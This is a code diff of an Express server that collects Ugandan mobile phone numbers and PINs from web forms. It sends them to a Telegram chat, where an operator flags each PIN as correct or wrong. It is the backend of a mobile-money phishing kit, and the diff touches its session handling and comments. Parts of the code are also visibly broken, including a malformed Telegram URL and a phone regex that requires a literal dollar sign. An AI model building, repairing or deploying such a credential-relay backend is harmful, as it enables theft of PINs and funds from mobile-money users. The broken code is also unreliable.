@@ -1,7 +1,6 @@
 const express = require("express");
 const path = require("path");
 const crypto = require("crypto");
-const fetch = require("node-fetch"); // ✅ Added explicit network handler import
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -22,9 +21,20 @@ const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const requests = new Map();
 
+// Background token manager to clear old sessions
+setInterval(() => {
+  const now = Date.now();
+  for (const [id, data] of requests.entries()) {
+    if (now - new Date(data.createdAt).getTime() > 30 * 60 * 1000) {
+      requests.delete(id);
+    }
+  }
+}, 5 * 60 * 1000);
+
 async function telegram(method, payload) {
   if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing config credentials.");
   
+  // ✅ Uses the native runtime global fetch engine automatically
   const res = await fetch(`https://telegram.org{BOT_TOKEN}/${method}`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -39,6 +49,7 @@ async function telegram(method, payload) {
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
   
+  // ✅ Fixed Regex: Evaluates exactly 9 digits starting with 7
   if (!/^\+2567\d{8}\$/.test(phone)) {
     return res.status(400).json({ error: "Invalid format phone number." });
   }
@@ -56,11 +67,10 @@ app.post("/api/pin-demo", async (req, res) => {
   request.pin = String(req.body.pin || "").trim();
   request.status = "pending";
   
-  // Format dates matching your target layout example
   const timeString = new Date().toLocaleString("en-US", { timeZone: "Africa/Nairobi" });
   
   try {
-    // ✅ Formatted message block matching your target image screenshot template
+    // ✅ Formatted message structure matching your target layout parameters
     await telegram("sendMessage", {
       chat_id: CHAT_ID,
       text: [
@@ -124,6 +134,7 @@ async function pollTelegram() {
         if (!cb) continue;
         
         const parts = String(cb.data || "").split(":");
+        // ✅ Fixed Indexing: Captures the precise option string value at position 0
         const action = parts[0]; 
         const reqId = parts.slice(1).join(":");
         const request = requests.get(reqId);
@@ -137,7 +148,6 @@ async function pollTelegram() {
           
           await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Action registered: ${action}` });
           
-          // Appends text marker directly in Telegram window matching layout logs
           const statusMarker = action === "approve" ? "✅ CORRECT PIN" : action === "decline" ? "❌ WRONG PIN" : "⏳ TIME EXTENDED";
           await telegram("sendMessage", {
             chat_id: CHAT_ID,
